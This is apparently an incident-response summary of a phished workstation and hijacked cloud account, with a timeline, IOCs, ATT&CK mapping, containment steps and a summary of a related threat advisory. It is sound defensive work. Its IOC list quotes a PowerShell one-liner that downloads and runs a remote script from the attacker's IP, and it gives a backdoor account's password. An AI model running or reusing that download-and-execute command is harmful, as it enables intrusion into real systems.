---
title: Compiled Investigation Summary — mrodriguez / WKSTN-017 Compromise
date_compiled: 2026-07-25
sources:
  - cloud.md (Azure AD sign-in + audit logs)
  - endpoint.md (Windows Security + Sysmon logs)
  - correlation-2026-07-10-mrodriguez-compromise.md
  - ti-2026-07-23-laundry-bear-zimbra-zcs.md (CISA AA26-204A)
---

# Compiled Findings: mrodriguez / WKSTN-017 Compromise (2026-07-10)

## Executive Summary

Four documents describe **one confirmed cross-domain intrusion** (endpoint → cloud → on-prem lateral movement) plus **one external threat-intel advisory** (LAUNDRY BEAR/Zimbra) that shares thematic TTPs but has **no direct IOC overlap** with the incident — treat them as related context, not the same actor.

## 1. The Confirmed Incident

*(sources: endpoint.md, cloud.md, correlation doc)*

### Unified attack chain (all times UTC, 2026-07-10)

| Time | Domain | Event |
|---|---|---|
| 09:06:57 | Endpoint | Chrome launched on WKSTN-017 (likely delivery vector) |
| 09:07:52 | Endpoint | `WINWORD.EXE` opens `Invoice_7742.docm` → hidden base64 PowerShell |
| 09:08:05 | Endpoint | PowerShell → outbound C2 to **185.220.101.47:443** |
| 11:00:14 | Cloud | Sign-in from **185.220.101.47** (Bucharest/Tor), high risk, no device, CA passes |
| 11:26:37 | Cloud | Concurrent legit sign-in from Austin/WKSTN-017 (real user still working) |
| 11:35:22 | Cloud | New MFA method ("Microsoft Authenticator") registered from the attacker IP |
| 11:50:47 | Cloud | OAuth consent granted to rogue app **"Data Sync Helper"** (`Mail.Read/ReadWrite`, `Directory.Read.All`, `offline_access`) |
| 16:04:51 | Endpoint | mrodriguez logon to **FS01** from WKSTN-017's own IP |
| 16:06:14–55 | Endpoint | `net.exe user helpdesk2 ... /add` → backdoor account **helpdesk2** created |

**Key correlation insight:** the same IP (`185.220.101.47`, a Tor exit node) is both the endpoint C2 destination *and* the cloud sign-in source, ~2 hours apart. That shared IOC is what proves this is one operation, not two coincidences — it also resolves the cloud analyst's open question about whether this was a "cloud-only" hijack (it wasn't; the endpoint was hit first).

### IOCs

- `185.220.101.47` (Tor exit, 185.220.101.0/24) — linchpin indicator across both domains
- `Invoice_7742.docm` (lure), decoded payload: `IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.47/update.ps1')`
- Compromised identity: `mrodriguez` (`CORP\mrodriguez` = `mrodriguez@corp.com`)
- Rogue OAuth app: "Data Sync Helper"
- Backdoor account: `helpdesk2` / `P@ssw0rd2026!` (exposed in cleartext via process command line)

### ATT&CK highlights

T1204.002 / T1059.001 / T1027 / T1105 / T1071.001 (initial exec + C2) → T1550.001 / T1539 / T1078.004 (token replay into cloud) → T1098.005 (MFA persistence) → T1550.001 illicit consent (OAuth persistence, `offline_access`) → T1136 (backdoor account creation).

### Confidence

- **High** — mrodriguez is compromised and the two domains (endpoint + cloud) are one operation.
- **Medium** — exact token-theft mechanism (second-stage `update.ps1` never captured); whether "Data Sync Helper" actually exfiltrated mail (consent confirmed, no Graph/mail activity observed in-window).
- **Low/none** — any other user or IP being involved.

### Outstanding gaps

Second-stage payload contents; mail gateway logs (delivery vector); Graph `MailItemsAccessed` for the rogue app; proxy/DNS confirmation of the port 80→443 mismatch; FS01/DC1 Sysmon coverage; browser cookie/token-cache artifacts; log coverage beyond 2026-07-11.

### Recommended containment

- Disable mrodriguez **and** revoke refresh tokens/sessions (a password reset alone is insufficient given `offline_access`).
- Remove the "Data Sync Helper" service principal and the attacker-added MFA method.
- Delete the `helpdesk2` account and audit for use.
- Reset on-prem **and** cloud credentials.
- Isolate WKSTN-017 / FS01 for forensic capture of `update.ps1` and the process gap between 09:08–16:04.
- Block `185.220.101.47` / monitor the wider Tor-exit range.

## 2. Threat Intel Context

*(source: ti-2026-07-23-laundry-bear-zimbra-zcs.md, CISA AA26-204A)*

This is a **separate CISA advisory** on **LAUNDRY BEAR** (aka Void Blizzard / CL-STA-1114 / TA488), a Russian state-linked APT — **not directly linked by IOC to the mrodriguez incident**. It's included here because the correlation doc flags a thematic resemblance.

- **Mechanism:** near-zero-click stored XSS (CVE-2025-66376, patched Nov 2025) in Zimbra webmail, delivered via HTML email with an SVG-smuggled payload; runs in the victim's authenticated session via SOAP API calls.
- **Objective:** pure espionage — harvests 90 days of email, GAL, autocomplete passwords, 2FA scratch codes; establishes persistence by enabling IMAP and minting a "ZimbraWeb" application passcode.
- **Exfil:** dual-channel — bulk data over HTTPS, smaller values (creds, 2FA codes) over Base32-encoded DNS queries — to custom "Flowerbed/Catcher" VPS infrastructure.
- **Infrastructure IOCs:** 9 tracked domains/IPs (e.g., `zmailanalytics[.]com`, `zimbra-metadata[.]com`) active Jul 2025–Mar 2026, associated TLS cert hashes, and several proton.me/pinmx.net actor-controlled email addresses.
- **Why it's relevant:** the same *pattern* — durable mail-scoped persistence via MFA/app-passcode manipulation rather than smash-and-grab — parallels the "Data Sync Helper" + new-MFA-method persistence seen in the mrodriguez incident. This is a **TTP similarity, not attribution evidence**; there's no shared infrastructure, hash, or domain between the two documents.
- **Simulation guidance:** Atomic Red Team coverage exists for the generic techniques (obfuscation, DNS/HTTPS exfil, MFA tampering, GAL enumeration) but **not** for the bespoke SVG-XSS exploit chain itself — that needs a custom lab exercise.
